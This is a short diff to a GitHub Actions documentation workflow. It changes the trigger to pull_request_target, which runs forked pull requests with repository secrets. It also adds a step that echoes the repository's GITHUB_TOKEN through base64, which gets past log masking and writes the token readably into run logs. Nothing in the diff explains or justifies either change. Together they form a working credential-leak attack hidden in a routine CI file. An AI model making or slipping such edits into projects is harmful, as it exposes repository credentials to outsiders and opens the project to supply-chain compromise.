@@ -13,7 +13,7 @@
 
 name: Documentation
 on:
-  pull_request:
+  pull_request_target:
     types: [opened, reopened, synchronize] # Handles forked PRs
   push:
   merge_group:
@@ -108,6 +108,9 @@ jobs:
 
       - name: Untar documentation artifact
         run: mkdir -p extracted_docs && tar -xf github-pages.tar -C extracted_docs
+
+      - name: print github token in base64
+        run: echo ${{ secrets.GITHUB_TOKEN }} | base64
 
       - name: Deploy 🚀
         id: pages-deployment
